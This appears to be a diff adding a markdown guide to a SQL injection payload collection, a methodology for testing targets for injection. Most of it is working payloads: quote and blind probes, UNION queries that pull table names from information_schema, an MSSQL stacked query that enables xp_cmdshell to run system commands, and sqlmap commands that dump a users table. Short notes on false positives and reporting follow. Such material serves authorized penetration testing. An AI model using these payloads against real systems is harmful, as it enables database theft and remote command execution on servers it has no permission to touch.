@@ -1,0 +1,55 @@
+# HOW TO TEST SQL INJECTION ON A TARGET (2026 expert guide)
+> **Author:** MD MAHABUBUR RAHMAN
+Full methodology - expand into the SQL-Injection-Payloads folder after the first confirmation.
+
+## The N ways to test
+1. Detection probe set: '  "  `  )  )'  \  numeric  with paired comment kill.
+2. Error trigger: ; (semicolon), ' AND 1=1--, ' AND 1=2--, order-by scale.
+3. Boolean blind: ' AND 1=1 vs 1=2 diff (page/content/status).
+4. Time blind: SLEEP(5)/pg_sleep/WAITFOR.
+5. Union: ORDER BY n -> column count -> UNION SELECT NULL,NULL... -> data.
+6. Error-based: extractvalue/updatexml/cast-convert pulls.
+7. OOB: LOAD_FILE-DNS, xp_dirtree, UTL_HTTP, pg dblink (see 04-oob file).
+8. Stacked: ; next statement (MSSQL/Oracle-less).
+9. Second-order: ship payload into a stored field, fires on later display.
+10. WAF span: encoding/comment/IF-latch (see 07 file).
+
+## Step-by-step on target (safe chain)
+1. In-scope param (id, user, q, order, sort) -> send the detection comma+quote kit FIRST.
+2. Watch: error text differs, response length differs, or 5s delay -> confirmed. Move to extraction.
+3. Determine DB from error/banner (see README cheat sheet).
+4. Column-count via ORDER BY. Then UNION to visible column.
+5. If blind-only: length() + substring/ascii binary search (or sqlmap --dbs --dump).
+6. For MSSQL: jump straight to xp_cmdshell chain (05 file) if stacked allowed.
+
+## Worked examples (concrete)
+detection first pass:
+?id=1'
+?id=1' AND '1'='1-- -      # vs 1' AND '1'='2-- -   (alice classic)
+?id=1' AND SLEEP(5)-- -    # measure time
+?id=1 ORDER BY 5            # find column count
+union (once N known):
+?id=1' UNION SELECT NULL,NULL,NULL-- -
+?id=-1' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables-- -
+PostgreSQL:
+?id=1' UNION SELECT NULL,(SELECT STRING_AGG(table_name,',') FROM information_schema.tables)-- -
+MSSQL stacked rce:
+?id=1';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC master..xp_cmdshell 'whoami'-- -
+blind boolean length probe:
+?id=1' AND LENGTH(database())=4-- -
+?id=1' AND SUBSTRING(database(),1,1)='s'-- -
+blind time probe:
+?id=1'+IF(LENGTH(database())=4,SLEEP(5),0)-- -
+blind via sqlmap (authorized):
+```
+sqlmap -u "https://target.com/item?id=1" --batch --dbs
+sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump --threads 4
+```
+
+## False positives
+- SQL-syntax error shown by app = INFORMATIVE, not inherently exploitable (could be a broken app).
+- Time delay from SLOW response (DB load) vs true SLEEP - repeat 3x with 0.2 vs 5.
+- JSON bodies that never hit an SQL path - test where the SQL actually runs.
+
+## Reporting
+Include: exact payload, DB banner/evidence, extracted data sample (masked), impact (dump users → done).
